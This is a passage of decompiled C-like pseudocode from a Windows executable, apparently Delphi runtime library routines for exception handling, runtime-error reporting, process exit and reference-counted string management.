  local_c = (int **)0x0;
  puStack_20 = &LAB_004036e0;
  uStack_24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_24;
  *param_3 = (int *)0x0;
  local_8 = param_2;
  piVar1 = FUN_004036f0(*param_1,param_2);
  if (piVar1 != (int *)0x0) {
    if (piVar1[5] == 0) {
      FUN_0040362c(param_1,(undefined *)piVar1[6],(int **)&local_c);
      FUN_00405650(param_3,local_c);
    }
    else {
      *param_3 = (int *)((int)param_1 + piVar1[5]);
      if (*param_3 != (int *)0x0) {
        (**(code **)(**param_3 + 4))();
      }
    }
  }
  *in_FS_OFFSET = uStack_24;
  puStack_1c = &LAB_004036e7;
  puStack_20 = (undefined *)0x4036df;
  FUN_00405638((int **)&local_c);
  return;
}



int * FUN_004036f0(int param_1,int *param_2)

{
  int *piVar1;
  int iVar2;
  
  do {
    piVar1 = *(int **)(param_1 + -0x48);
    if (piVar1 != (int *)0x0) {
      iVar2 = *piVar1;
      piVar1 = piVar1 + 1;
      do {
        if ((((*param_2 == *piVar1) && (param_2[1] == piVar1[1])) && (param_2[2] == piVar1[2])) &&
           (param_2[3] == piVar1[3])) {
          return piVar1;
        }
        piVar1 = piVar1 + 7;
        iVar2 = iVar2 + -1;
      } while (iVar2 != 0);
    }
    if (*(int **)(param_1 + -0x24) == (int *)0x0) {
      return (int *)0x0;
    }
    param_1 = **(int **)(param_1 + -0x24);
  } while( true );
}



undefined4 FUN_00403734(int *param_1,int param_2)

{
  int *piVar1;
  
  if (param_1 != (int *)0x0) {
    piVar1 = thunk_FUN_004037a4(*param_1,param_2);
    if ((char)piVar1 != '\0') {
      return CONCAT31((int3)((uint)piVar1 >> 8),1);
    }
  }
  return 0;
}



void FUN_00403758(int param_1)

{
  uint uVar1;
  ushort unaff_SI;
  ushort *puVar2;
  bool bVar3;
  
  do {
    puVar2 = *(ushort **)(param_1 + -0x30);
    if (puVar2 != (ushort *)0x0) {
      uVar1 = (uint)*puVar2;
      bVar3 = puVar2 + 1 == (ushort *)0x0;
      puVar2 = puVar2 + 1;
      do {
        if (uVar1 == 0) break;
        uVar1 = uVar1 - 1;
        bVar3 = unaff_SI == *puVar2;
        puVar2 = puVar2 + 1;
      } while (!bVar3);
      if (bVar3) {
        return;
      }
    }
    if (*(int **)(param_1 + -0x24) == (int *)0x0) {
      return;
    }
    param_1 = **(int **)(param_1 + -0x24);
  } while( true );
}



int * thunk_FUN_004037a4(int param_1,int param_2)

{
  int *piVar1;
  
  while( true ) {
    if (param_1 == param_2) {
      return (int *)CONCAT31((int3)((uint)param_1 >> 8),1);
    }
    piVar1 = *(int **)(param_1 + -0x24);
    if (piVar1 == (int *)0x0) break;
    param_1 = *piVar1;
  }
  return piVar1;
}



int * FUN_004037a4(int param_1,int param_2)

{
  int *piVar1;
  
  while( true ) {
    if (param_1 == param_2) {
      return (int *)CONCAT31((int3)((uint)param_1 >> 8),1);
    }
    piVar1 = *(int **)(param_1 + -0x24);
    if (piVar1 == (int *)0x0) break;
    param_1 = *piVar1;
  }
  return piVar1;
}



// WARNING: Variable defined which should be unmapped: param_6

void FUN_004037f0(int param_1,char param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
                 undefined4 param_6,undefined4 param_7)

{
  int *in_FS_OFFSET;
  
  if (-1 < param_2) {
    (**(code **)(param_1 + -0xc))();
  }
  *in_FS_OFFSET = (int)&param_4;
  return;
}



void FUN_00403840(int *param_1)

{
  (**(code **)(*param_1 + -8))();
  return;
}



int * FUN_00403848(int *param_1)

{
  (**(code **)(*param_1 + -0x1c))();
  return param_1;
}



int * FUN_00403858(int *param_1,char param_2)

{
  if (param_2 < '\x01') {
    return param_1;
  }
  (**(code **)(*param_1 + -0x18))();
  return param_1;
}



undefined4 FUN_00403884(undefined4 param_1)

{
  if ((char)PTR_FUN_0041802c != '\0') {
    (*DAT_00419014)();
    param_1 = 2;
  }
  return param_1;
}



undefined4 FUN_004038a8(void)

{
  (*DAT_00419014)();
  return 0;
}



void FUN_004038c0(void)

{
  if (1 < (byte)PTR_FUN_0041802c) {
    FUN_004038a8();
    return;
  }
  return;
}



int FUN_004038d4(int param_1,undefined4 param_2,char *param_3)

{
  if (((param_3 != (char *)0x0) && (param_1 = *(int *)(param_3 + 1), *param_3 != -0x17)) &&
     (*param_3 == -0x15)) {
    param_1 = (int)(char)param_1;
  }
  return param_1;
}



undefined4 * FUN_004038f4(undefined4 *param_1,undefined4 param_2,char *param_3)

{
  undefined4 uStack_10;
  char *pcStack_c;
  undefined4 uStack_8;
  undefined4 *puStack_4;
  
  if (1 < (byte)PTR_FUN_0041802c) {
    uStack_10 = 0x403905;
    pcStack_c = param_3;
    uStack_8 = param_2;
    puStack_4 = param_1;
    FUN_004038d4((int)param_1,param_2,param_3);
    param_1 = &uStack_10;
    (*DAT_00419014)();
  }
  return param_1;
}



undefined4 FUN_00403938(undefined4 param_1)

{
  if (1 < (byte)PTR_FUN_0041802c) {
    (*DAT_00419014)();
  }
  return param_1;
}



undefined4 FUN_00403958(undefined param_1,undefined param_2,undefined param_3,int *param_4)

{
  int iVar1;
  LONG LVar2;
  int *piVar3;
  undefined4 *puVar4;
  undefined4 uVar5;
  int iVar6;
  int unaff_ESI;
  undefined4 *in_FS_OFFSET;
  PCONTEXT in_stack_00000008;
  undefined4 uStackY_34;
  PCONTEXT pCStackY_30;
  undefined4 uStackY_2c;
  int *piStackY_28;
  undefined4 uStackY_24;
  int iStackY_20;
  int iStackY_1c;
  int *piStackY_18;
  undefined4 uStackY_14;
  
  if ((param_4[1] & 6U) != 0) {
    return 1;
  }
  iVar1 = param_4[6];
  iVar6 = param_4[5];
  if (*param_4 != 0xeedfade) {
    FUN_0040350c();
    if (DAT_00419010 == (code *)0x0) {
      return 1;
    }
    iVar1 = (*DAT_00419010)();
    if (iVar1 == 0) {
      return 1;
    }
    if (((*param_4 != 0xeefface) && (iVar1 = FUN_00403884(iVar1), (byte)PTR_FUN_00418030 != 0)) &&
       ((char)PTR_FUN_0041802c == '\0')) {
      LVar2 = UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&param_4);
      if (LVar2 == 0) {
        return 1;
      }
      iVar6 = param_4[3];
      piVar3 = param_4;
      goto LAB_00403a0c;
    }
    iVar6 = param_4[3];
  }
  piVar3 = param_4;
  if ((1 < (byte)PTR_FUN_00418030) && ((char)PTR_FUN_0041802c == '\0')) {
    uStackY_14 = 0x403a04;
    LVar2 = UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&param_4);
    if (LVar2 == 0) {
      return 1;
    }
  }
LAB_00403a0c:
  piVar3[1] = piVar3[1] | 2;
  uStackY_14 = *in_FS_OFFSET;
  uStackY_24 = 0;
  uStackY_2c = 0x403a30;
  pCStackY_30 = in_stack_00000008;
  uStackY_34 = 0x403a30;
  piStackY_28 = piVar3;
  iStackY_20 = iVar6;
  iStackY_1c = iVar1;
  piStackY_18 = piVar3;
  (*DAT_00419018)();
  uStackY_34 = 0x403a39;
  puVar4 = (undefined4 *)FUN_00405d2c();
  uStackY_34 = *puVar4;
  *puVar4 = &uStackY_34;
  iVar1 = *(int *)(unaff_ESI + 4);
  *(undefined **)(unaff_ESI + 4) = &LAB_00403a5c;
  FUN_004038c0();
                    // WARNING: Could not recover jumptable at 0x00403a5a. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar5 = (*(code *)(iVar1 + 5))();
  return uVar5;
}



undefined4
FUN_00403a84(undefined param_1,undefined param_2,undefined param_3,undefined4 *param_4,int param_5)

{
  int iVar1;
  code *extraout_ECX;
  
  if ((param_4[1] & 6) != 0) {
    iVar1 = *(int *)(param_5 + 4);
    *(undefined4 *)(param_5 + 4) = 0x403ab4;
    FUN_004038f4(param_4,param_5,(char *)(iVar1 + 5));
    (*extraout_ECX)();
  }
  return 1;
}



void FUN_00403abc(int param_1)

{
  if (param_1 == 0) {
    FUN_00404050(0xd8);
  }
                    // WARNING: Could not recover jumptable at 0x00403add. Too many branches
                    // WARNING: Treating indirect jump as call
  (*DAT_00419014)();
  return;
}



void FUN_00403b68(undefined param_1,undefined param_2,undefined param_3,undefined4 param_4,
                 int param_5)

{
  undefined4 *in_FS_OFFSET;
  
  *in_FS_OFFSET = param_4;
  (*(code *)(param_5 + 5))();
  return;
}



void FUN_00403cc0(void)

{
  int iVar1;
  int unaff_EBP;
  int *in_FS_OFFSET;
  
  DAT_00419634 = (int *)(unaff_EBP + -0xc);
  iVar1 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int)DAT_00419634;
  *DAT_00419634 = iVar1;
  *(undefined **)(unaff_EBP + -8) = &LAB_00403c20;
  *(int *)(unaff_EBP + -4) = unaff_EBP;
  return;
}



void FUN_00403ce0(void)

{
  int **ppiVar1;
  int **in_FS_OFFSET;
  
  if (DAT_00419634 != (int **)0x0) {
    ppiVar1 = (int **)*in_FS_OFFSET;
    if (DAT_00419634 == ppiVar1) {
      *in_FS_OFFSET = *DAT_00419634;
      return;
    }
    for (; ppiVar1 != (int **)0xffffffff; ppiVar1 = (int **)*ppiVar1) {
      if ((int **)*ppiVar1 == DAT_00419634) {
        *ppiVar1 = *DAT_00419634;
        return;
      }
    }
  }
  return;
}



void FUN_00403d08(void)

{
  int iVar1;
  code *pcVar2;
  int iVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  
  iVar3 = DAT_0041963c;
  puStack_14 = &stack0xfffffffc;
  if (DAT_00419638 != 0) {
    iVar1 = *(int *)(DAT_00419638 + 4);
    puStack_18 = &LAB_00403d4e;
    uStack_1c = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack_1c;
    if (0 < iVar3) {
      do {
        iVar3 = iVar3 + -1;
        pcVar2 = *(code **)(iVar1 + 4 + iVar3 * 8);
        DAT_0041963c = iVar3;
        if (pcVar2 != (code *)0x0) {
          (*pcVar2)();
        }
      } while (0 < iVar3);
    }
    *in_FS_OFFSET = uStack_1c;
  }
  return;
}



void FUN_00403d68(void)

{
  int iVar1;
  int iVar2;
  code *pcVar3;
  int iVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  
  puStack_14 = &stack0xfffffffc;
  if (DAT_00419638 != (int *)0x0) {
    iVar1 = *DAT_00419638;
    iVar4 = 0;
    iVar2 = DAT_00419638[1];
    puStack_18 = &LAB_00403dae;
    uStack_1c = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack_1c;
    if (0 < iVar1) {
      do {
        pcVar3 = *(code **)(iVar2 + iVar4 * 8);
        iVar4 = iVar4 + 1;
        DAT_0041963c = iVar4;
        if (pcVar3 != (code *)0x0) {
          (*pcVar3)();
        }
      } while (iVar4 < iVar1);
    }
    *in_FS_OFFSET = uStack_1c;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403dc8(undefined4 param_1,int param_2)

{
  DAT_00419014 = &DAT_00401190;
  DAT_00419018 = &DAT_004011a0;
  DAT_0041963c = 0;
  _DAT_0041902c = *(undefined4 *)(param_2 + 4);
  DAT_00419638 = param_1;
  DAT_00419640 = param_2;
  FUN_00403cc0();
  DAT_00419034 = 0;
  FUN_00403d68();
  return;
}



void FUN_00403e08(int *param_1)

{
  int **ppiVar1;
  int iVar2;
  
  iVar2 = *param_1;
  ppiVar1 = (int **)(param_1 + 1);
  do {
    FUN_00405ac0((int **)*ppiVar1[1],*ppiVar1);
    ppiVar1 = ppiVar1 + 2;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



void FUN_00403e30(int *param_1)

{
  int **ppiVar1;
  int iVar2;
  
  iVar2 = *param_1;
  ppiVar1 = (int **)(param_1 + 1);
  do {
    **ppiVar1 = *ppiVar1[1] + (int)ppiVar1[2];
    ppiVar1 = ppiVar1 + 3;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



void FUN_00403e54(void)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  
  uVar2 = 0x10;
  iVar1 = DAT_00418000;
  do {
    s_Runtime_error_at_00000000_00418074[uVar2 & 0xff] = (char)(iVar1 % 10) + '0';
    iVar1 = iVar1 / 10;
    uVar2 = uVar2 - 1;
  } while (iVar1 != 0);
  uVar3 = 0x1c;
  uVar2 = DAT_00418004;
  do {
    s_Runtime_error_at_00000000_00418074[uVar3 & 0xff] = (&DAT_00418094)[uVar2 & 0xf];
    uVar2 = uVar2 >> 4;
    uVar3 = uVar3 - 1;
  } while (uVar2 != 0);
  return;
}



// WARNING: Unable to track spacebase fully for stack

bool FUN_00403eb0(void)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  
  iVar1 = DAT_00418000;
  LOCK();
  DAT_00418000 = 0;
  UNLOCK();
  puVar3 = DAT_00419630;
  puVar4 = &DAT_00419630;
  for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar4 = *puVar3;
    puVar3 = puVar3 + 1;
    puVar4 = puVar4 + 1;
  }
  return (bool)('\x01' - (iVar1 != 0));
}



void FUN_00403ee0(undefined4 param_1,undefined4 param_2,DWORD param_3)

{
  HANDLE pvVar1;
  char *lpBuffer;
  undefined *lpBuffer_00;
  DWORD DVar2;
  DWORD *lpNumberOfBytesWritten;
  DWORD *lpNumberOfBytesWritten_00;
  LPOVERLAPPED p_Var3;
  DWORD local_4;
  
  local_4 = param_3;
  if (DAT_00419044 != '\0') {
    if ((DAT_00419218 == -0x284e) && (DAT_00419220 != 0)) {
      (*DAT_00419230)(&DAT_00419214);
    }
    lpNumberOfBytesWritten = &local_4;
    lpNumberOfBytesWritten_00 = &local_4;
    p_Var3 = (LPOVERLAPPED)0x0;
    DVar2 = 0x1e;
    lpBuffer = s_Runtime_error_at_00000000_00418074;
    pvVar1 = GetStdHandle(0xfffffff5);
    WriteFile(pvVar1,lpBuffer,DVar2,lpNumberOfBytesWritten,p_Var3);
    p_Var3 = (LPOVERLAPPED)0x0;
    DVar2 = 2;
    lpBuffer_00 = &DAT_00403f68;
    pvVar1 = GetStdHandle(0xfffffff5);
    WriteFile(pvVar1,lpBuffer_00,DVar2,lpNumberOfBytesWritten_00,p_Var3);
    return;
  }
  if ((char)PTR_FUN_00418034 == '\0') {
    MessageBoxA((HWND)0x0,s_Runtime_error_at_00000000_00418074,s_Error_0041806c,0);
  }
  return;
}



void FUN_00403f6c(void)

{
  HMODULE hLibModule;
  code *pcVar1;
  undefined4 uVar2;
  DWORD extraout_ECX;
  undefined *extraout_ECX_00;
  int iVar3;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 *puVar4;
  undefined4 *puVar5;
  byte bVar6;
  
  bVar6 = 0;
  if ((DAT_00419658 == 0) && (DAT_00419040 != (code *)0x0)) {
    do {
      pcVar1 = DAT_00419040;
      DAT_00419040 = (code *)0x0;
      (*pcVar1)();
    } while (DAT_00419040 != (code *)0x0);
  }
  if (DAT_00418004 != 0) {
    uVar2 = FUN_00403e54();
    FUN_00403ee0(uVar2,extraout_EDX,extraout_ECX);
    DAT_00418004 = 0;
  }
  while( true ) {
    if ((DAT_00419658 == 2) && (DAT_00418000 == 0)) {
      DAT_0041963c = 0;
    }
    FUN_00403d08();
    if (((DAT_00419658 < 2) || (DAT_00418000 != 0)) && (DAT_00419640 != (undefined4 *)0x0)) {
      FUN_004055c8(DAT_00419640,extraout_EDX_00,extraout_ECX_00);
      hLibModule = (HMODULE)DAT_00419640[4];
      if ((hLibModule != (HMODULE)DAT_00419640[1]) && (hLibModule != (HMODULE)0x0)) {
        FreeLibrary(hLibModule);
      }
    }
    FUN_00403ce0();
    if (DAT_00419658 == 1) {
      (*DAT_00419654)();
    }
    if (DAT_00419658 != 0) {
      FUN_00403eb0();
    }
    if (DAT_00419630 == (undefined4 *)0x0) break;
    puVar4 = DAT_00419630;
    puVar5 = &DAT_00419630;
    for (iVar3 = 0xb; iVar3 != 0; iVar3 = iVar3 + -1) {
      *puVar5 = *puVar4;
      puVar4 = puVar4 + (uint)bVar6 * -2 + 1;
      puVar5 = puVar5 + (uint)bVar6 * -2 + 1;
    }
  }
  if (DAT_00419024 != (code *)0x0) {
    (*DAT_00419024)();
  }
                    // WARNING: Subroutine does not return
  ExitProcess(DAT_00418000);
}



void FUN_00404044(undefined4 param_1)

{
  DAT_00418000 = param_1;
  FUN_00403f6c();
  return;
}



void FUN_00404050(undefined4 param_1)

{
  undefined4 in_stack_00000000;
  
  DAT_00418004 = in_stack_00000000;
  FUN_00404044(param_1);
  return;
}



int * FUN_0040405c(int *param_1)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = *param_1;
  if ((iVar2 != 0) && (*param_1 = 0, 0 < *(int *)(iVar2 + -8))) {
    LOCK();
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    UNLOCK();
    if (*piVar1 == 0) {
      FUN_004026b0(iVar2 + -8);
    }
  }
  return param_1;
}



void FUN_00404080(int *param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  
  do {
    iVar2 = *param_1;
    if ((iVar2 != 0) && (*param_1 = 0, 0 < *(int *)(iVar2 + -8))) {
      LOCK();
      piVar1 = (int *)(iVar2 + -8);
      *piVar1 = *piVar1 + -1;
      UNLOCK();
      if (*piVar1 == 0) {
        FUN_004026b0(iVar2 + -8);
      }
    }
    param_1 = param_1 + 1;
    param_2 = param_2 + -1;
  } while (param_2 != 0);
  return;
}



void FUN_004040b0(int *param_1,undefined4 *param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 *puVar3;
  
  if (param_2 != (undefined4 *)0x0) {
    iVar2 = param_2[-2];
    if (iVar2 == -1 || SCARRY4(iVar2,1) != iVar2 + 1 < 0) {
      puVar3 = FUN_00404120(param_2[-1]);
      FUN_00402890(param_2,puVar3,param_2[-1]);
      param_2 = puVar3;
    }
    else {
      LOCK();
      param_2[-2] = param_2[-2] + 1;
      UNLOCK();
    }
  }
  LOCK();
  iVar2 = *param_1;
  *param_1 = (int)param_2;
  UNLOCK();
  if ((iVar2 != 0) && (0 < *(int *)(iVar2 + -8))) {
    LOCK();
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    UNLOCK();
    if (*piVar1 == 0) {
      FUN_004026b0(iVar2 + -8);
    }
  }
  return;
}



void FUN_004040f4(int *param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  
  if ((param_2 != 0) &&
     (iVar2 = *(int *)(param_2 + -8), iVar2 != -1 && SCARRY4(iVar2,1) == iVar2 + 1 < 0)) {
    LOCK();
    *(int *)(param_2 + -8) = *(int *)(param_2 + -8) + 1;
    UNLOCK();
  }
  LOCK();
  iVar2 = *param_1;
  *param_1 = param_2;
  UNLOCK();
  if ((iVar2 != 0) && (0 < *(int *)(iVar2 + -8))) {
    LOCK();
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    UNLOCK();
    if (*piVar1 == 0) {
      FUN_004026b0(iVar2 + -8);
    }
  }
  return;
}



undefined4 * FUN_00404120(int param_1)

{
  uint uVar1;
  undefined4 *puVar2;
  
  if (0 < param_1) {
    uVar1 = param_1 + 10U & 0xfffffffe;
    puVar2 = (undefined4 *)FUN_00402690(uVar1);
    *(undefined2 *)((uVar1 - 2) + (int)puVar2) = 0;
    puVar2[1] = param_1;
    *puVar2 = 1;
    return puVar2 + 2;
  }
  return (undefined4 *)0x0;
}



void FUN_0040414c(int *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 *puVar1;
  
  puVar1 = FUN_00404120(param_3);
  if (param_2 != (undefined4 *)0x0) {
    FUN_00402890(param_2,puVar1,param_3);
  }
  FUN_0040405c(param_1);
  *param_1 = (int)puVar1;
  return;
}



void FUN_0040417c(LPSTR param_1,int param_2,LPCWSTR param_3,int param_4)

{
  WideCharToMultiByte(DAT_004195b8,0,param_3,param_4,param_1,param_2,(LPCSTR)0x0,(LPBOOL)0x0);
  return;
}



void FUN_0040419c(LPWSTR param_1,int param_2,LPCSTR param_3,int param_4)

{
  MultiByteToWideChar(DAT_004195b8,0,param_3,param_4,param_1,param_2);
  return;
}



void FUN_004041b8(LPSTR *param_1,LPCWSTR param_2,int param_3)

{
  uint uVar1;
  LPSTR *local_1010 [1024];
  
  local_1010[0] = param_1;
  if (param_3 < 1) {
    FUN_0040405c((int *)param_1);
  }
  else {
    if ((param_3 + 1 < 0x7ff) &&
       (uVar1 = FUN_0040417c((LPSTR)local_1010,0xfff,param_2,param_3), -1 < (int)uVar1)) {
      FUN_0040414c((int *)param_1,local_1010,uVar1);
      return;
    }
    uVar1 = (param_3 + 1) * 2;
    FUN_00404628((int *)param_1,uVar1);
    uVar1 = FUN_0040417c(*param_1,uVar1,param_2,param_3);
    if ((int)uVar1 < 0) {
      uVar1 = 0;
    }
    FUN_00404628((int *)param_1,uVar1);
  }
  return;
}



void FUN_00404244(int *param_1,undefined4 param_2)

{
  undefined4 uStack_4;
  
  uStack_4 = param_2;
  FUN_0040414c(param_1,&uStack_4,1);
  return;
}



void FUN_00404254(int *param_1,undefined4 *param_2)

{
  uint uVar1;
  undefined4 *puVar2;
  
  uVar1 = 0;
  puVar2 = param_2;
  if (param_2 != (undefined4 *)0x0) {
    for (; *(char *)puVar2 != '\0'; puVar2 = puVar2 + 1) {
      if (*(char *)((int)puVar2 + 1) == '\0') {
LAB_00404275:
        puVar2 = (undefined4 *)((int)puVar2 + 1);
        break;
      }
      if (*(char *)((int)puVar2 + 2) == '\0') {
LAB_00404274:
        puVar2 = (undefined4 *)((int)puVar2 + 1);
        goto LAB_00404275;
      }
      if (*(char *)((int)puVar2 + 3) == '\0') {
        puVar2 = (undefined4 *)((int)puVar2 + 1);
        goto LAB_00404274;
      }
    }
    uVar1 = (int)puVar2 - (int)param_2;
  }
  FUN_0040414c(param_1,param_2,uVar1);
  return;
}



void FUN_00404284(LPSTR *param_1,LPCWSTR param_2)

{
  uint uVar1;
  LPCWSTR pWVar2;
  
  uVar1 = 0;
  pWVar2 = param_2;
  if (param_2 != (LPCWSTR)0x0) {
    for (; *pWVar2 != L'\0'; pWVar2 = pWVar2 + 4) {
      if (pWVar2[1] == L'\0') {
LAB_004042ad:
        pWVar2 = pWVar2 + 1;
        break;
      }
      if (pWVar2[2] == L'\0') {
LAB_004042aa:
        pWVar2 = pWVar2 + 1;
        goto LAB_004042ad;
      }
      if (pWVar2[3] == L'\0') {
        pWVar2 = pWVar2 + 1;
        goto LAB_004042aa;
      }
    }
    uVar1 = (uint)((int)pWVar2 - (int)param_2) >> 1;
  }
  FUN_004041b8(param_1,param_2,uVar1);
  return;
}



void FUN_004042c0(int *param_1,byte *param_2)

{
  FUN_0040414c(param_1,(undefined4 *)(param_2 + 1),(uint)*param_2);
  return;
}



void FUN_004042cc(int *param_1,undefined4 *param_2,uint param_3)

{
  uint uVar1;
  undefined4 *puVar2;
  bool bVar3;
  
  bVar3 = true;
  uVar1 = param_3;
  puVar2 = param_2;
  do {
    if (uVar1 == 0) break;
    uVar1 = uVar1 - 1;
    bVar3 = *(char *)puVar2 == '\0';
    puVar2 = (undefined4 *)((int)puVar2 + 1);
  } while (!bVar3);
  if (bVar3) {
    uVar1 = ~uVar1;
  }
  FUN_0040414c(param_1,param_2,uVar1 + param_3);
  return;
}



void FUN_004042e4(LPSTR *param_1,LPCWSTR param_2)

{
  uint uVar1;
  
  uVar1 = 0;
  if (param_2 != (LPCWSTR)0x0) {
    uVar1 = *(uint *)(param_2 + -2) >> 1;
  }
  FUN_004041b8(param_1,param_2,uVar1);
  return;
}



int FUN_004042f8(int param_1)

{
  if (param_1 != 0) {
    param_1 = *(int *)(param_1 + -4);
  }
  return param_1;
}



void FUN_00404300(int *param_1,undefined4 *param_2)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  undefined4 *puVar4;
  uint uVar5;
  
  if (param_2 == (undefined4 *)0x0) {
    return;
  }
  puVar4 = (undefined4 *)*param_1;
  if (puVar4 != (undefined4 *)0x0) {
    uVar3 = puVar4[-1];
    if (param_2 == puVar4) {
      FUN_00404628(param_1,param_2[-1] + uVar3);
      param_2 = (undefined4 *)*param_1;
      uVar5 = uVar3;
    }
    else {
      FUN_00404628(param_1,param_2[-1] + uVar3);
      uVar5 = param_2[-1];
    }
    FUN_00402890(param_2,(undefined4 *)(*param_1 + uVar3),uVar5);
    return;
  }
  if (param_2 != (undefined4 *)0x0) {
    iVar2 = param_2[-2];
    if (iVar2 == -1 || SCARRY4(iVar2,1) != iVar2 + 1 < 0) {
      puVar4 = FUN_00404120(param_2[-1]);
      FUN_00402890(param_2,puVar4,param_2[-1]);
      param_2 = puVar4;
    }
    else {
      LOCK();
      param_2[-2] = param_2[-2] + 1;
      UNLOCK();
    }
  }
  LOCK();
  iVar2 = *param_1;
  *param_1 = (int)param_2;
  UNLOCK();
  if ((iVar2 != 0) && (0 < *(int *)(iVar2 + -8))) {
    LOCK();
    piVar1 = (int *)(iVar2 + -8);
    *piVar1 = *piVar1 + -1;
    UNLOCK();
    if (*piVar1 == 0) {
      FUN_004026b0(iVar2 + -8);
    }
  }
  return;
}



void FUN_00404344(int *param_1,undefined4 *param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  undefined4 *puVar3;
  
  if (param_2 == (undefined4 *)0x0) {
    FUN_004040b0(param_1,param_3);
    return;
  }
  if (param_3 == (undefined4 *)0x0) {
    if (param_2 != (undefined4 *)0x0) {
      iVar2 = param_2[-2];
      if (iVar2 == -1 || SCARRY4(iVar2,1) != iVar2 + 1 < 0) {
        puVar3 = FUN_00404120(param_2[-1]);
        FUN_00402890(param_2,puVar3,param_2[-1]);
        param_2 = puVar3;
      }
      else {
        LOCK();
        param_2[-2] = param_2[-2] + 1;
        UNLOCK();
      }
    }
    LOCK();
    iVar2 = *param_1;
    *param_1 = (int)param_2;
    UNLOCK();
    if ((iVar2 != 0) && (0 < *(int *)(iVar2 + -8))) {
      LOCK();
      piVar1 = (int *)(iVar2 + -8);
      *piVar1 = *piVar1 + -1;
      UNLOCK();
      if (*piVar1 == 0) {
        FUN_004026b0(iVar2 + -8);
      }
    }
    return;
  }
  if (param_2 == (undefined4 *)*param_1) {
    FUN_00404300(param_1,param_3);
    return;
  }
  if (param_3 != (undefined4 *)*param_1) {
    FUN_004040b0(param_1,param_2);
    FUN_00404300(param_1,param_3);
    return;
  }
  puVar3 = FUN_00404120(param_2[-1] + param_3[-1]);
  FUN_00402890(param_2,puVar3,param_2[-1]);
  FUN_00402890(param_3,(undefined4 *)((int)puVar3 + param_2[-1]),param_3[-1]);
  if (puVar3 != (undefined4 *)0x0) {
    puVar3[-2] = puVar3[-2] + -1;
  }
  FUN_004040b0(param_1,puVar3);
  return;
}



void FUN_004043b8(int *param_1,int param_2)

{
  int iVar1;
  undefined4 *puVar2;
  uint uVar3;
  undefined4 *puVar4;
  int iVar5;
  undefined4 *puVar6;
  int iVar7;
  int *piVar8;
  code *UNRECOVERED_JUMPTABLE;
  undefined4 *puStack_18;
  
  iVar7 = 0;
  iVar1 = *(int *)(&stack0x00000000 + param_2 * 4);
  if ((iVar1 == 0) || (*param_1 != iVar1)) {
    uVar3 = 0;
    iVar5 = param_2;
  }
  else {
    uVar3 = *(uint *)(iVar1 + -4);
    iVar5 = param_2 + -1;
    iVar7 = iVar1;
  }
  do {
    iVar1 = *(int *)(&stack0x00000000 + iVar5 * 4);
    if ((iVar1 != 0) && (uVar3 = uVar3 + *(int *)(iVar1 + -4), iVar7 == iVar1)) {
      iVar7 = 0;
    }
    iVar5 = iVar5 + -1;
  } while (iVar5 != 0);
  if (iVar7 == 0) {
    puVar4 = FUN_00404120(uVar3);
    piVar8 = (int *)0x0;
    puStack_18 = puVar4;
  }
  else {
    iVar1 = *(int *)(iVar7 + -4);
    FUN_00404628(param_1,uVar3);
    param_2 = param_2 + -1;
    puVar4 = (undefined4 *)(iVar1 + *param_1);
    piVar8 = param_1;
    puStack_18 = (undefined4 *)*param_1;
  }
  do {
    puVar2 = *(undefined4 **)(&stack0x00000000 + param_2 * 4);
    puVar6 = puVar4;
    if (puVar2 != (undefined4 *)0x0) {
      puVar6 = (undefined4 *)((int)puVar4 + puVar2[-1]);
      FUN_00402890(puVar2,puVar4,puVar2[-1]);
    }
    param_2 = param_2 + -1;
    puVar4 = puVar6;
  } while (param_2 != 0);
  if (piVar8 == (int *)0x0) {
    if (puStack_18 != (undefined4 *)0x0) {
      puStack_18[-2] = puStack_18[-2] + -1;
    }
    FUN_004040b0(param_1,puStack_18);
  }
                    // WARNING: Could not recover jumptable at 0x0040443f. Too many branches
                    // WARNING: Treating indirect jump as call
  (*UNRECOVERED_JUMPTABLE)(UNRECOVERED_JUMPTABLE);
  return;
}



uint * FUN_00404444(uint *param_1,uint *param_2)

{
  uint uVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_1 != param_2) {
    if (param_1 == (uint *)0x0) {
      param_1 = (uint *)-param_2[-1];
    }
    else if (param_2 == (uint *)0x0) {
      param_1 = (uint *)param_1[-1];
    }
    else {
      uVar3 = param_2[-1];
      puVar2 = (uint *)(param_1[-1] - uVar3);
      if (param_1[-1] < uVar3 || puVar2 == (uint *)0x0) {
        uVar3 = uVar3 + (int)puVar2;
      }
      for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 2) {
        if (*param_1 != *param_2) {
          return puVar2;
        }
        if (uVar4 == 1) {
          param_1 = param_1 + 1;
          param_2 = param_2 + 1;
          break;
        }
        if (param_1[1] != param_2[1]) {
          return puVar2;
        }
        param_1 = param_1 + 2;
        param_2 = param_2 + 2;
      }
      uVar3 = uVar3 & 3;
